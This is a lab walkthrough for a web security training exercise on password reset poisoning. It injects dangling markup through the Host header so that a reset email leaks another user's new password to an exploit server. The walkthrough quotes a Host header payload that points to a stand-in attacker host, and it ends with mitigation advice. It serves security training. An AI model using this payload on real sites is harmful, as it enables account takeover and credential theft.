## Lab: Password Reset Poisoning via Dangling Markup

**Difficulty:** Expert  
**Category:** Web Security Academy - Host Header Injection  
**Tags:** `password reset poisoning` `dangling markup` 

###  Description

This lab demonstrates a host header injection attack that uses a *dangling markup injection* technique to exfiltrate sensitive data (like a password reset link or new password) from a password reset email by injecting malicious HTML.


###  Steps to Reproduce

1. **Log in to the Lab**
   - Use credentials: `wiener:peter`

2. **Trigger Password Reset**
   - Go to the **Forgot Password** page and request a reset for your own user.
   - Open the email client on the **Exploit Server** and examine the password reset email.
   - Notice: Instead of a reset token, the new password is directly included in the **email body**.

3. **Study Email Structure**
   - In Burp Proxy, observe the response to the `/email` request.
   - Note that the response HTML is sanitized **before rendering**, but you can switch to **raw HTML view**, which is not sanitized.

4. **Initial Host Header Injection**
   - Send a `POST /forgot-password` request in **Burp Repeater**.
   - Modify the `Host:` header to include an **arbitrary port** (e.g., `lab-id.web-security-academy.net:hacker.com`)
   - This will break the email HTML formatting and reveal how the server builds the email.

5. **Craft Dangling Markup Injection**
   - Send another `POST /forgot-password` request.
   - Use a payload like this in the `Host:` header:
     ```
     Host: YOUR-LAB-ID.web-security-academy.net:"><a href="//YOUR-EXPLOIT-SERVER.net">
     ```
   - This breaks the HTML context and appends a new `href` link to your exploit server.

6. **Capture the Password**
   - Check the email client and then inspect your **exploit server logs**.
   - Look for a request like:
     ```
     GET /?login
     ```
   - This request will contain the **rest of the email body**, including **Carlos’s new password**.

7. **Reset Carlos's Password**
   - Send a final `POST /forgot-password` request with the `username=carlos`.
   - Then view the exploit server log again to find Carlos’s new password.

8. **Login as Carlos**
   - Use the captured password to log in as `carlos` and solve the lab.

###  Mitigation

To prevent such attacks:
- Avoid including user-controlled input in HTML emails directly.
- Use proper sanitization libraries both on **rendered and raw content**.
- Avoid including sensitive information like passwords in emails; use reset links with tokens instead.
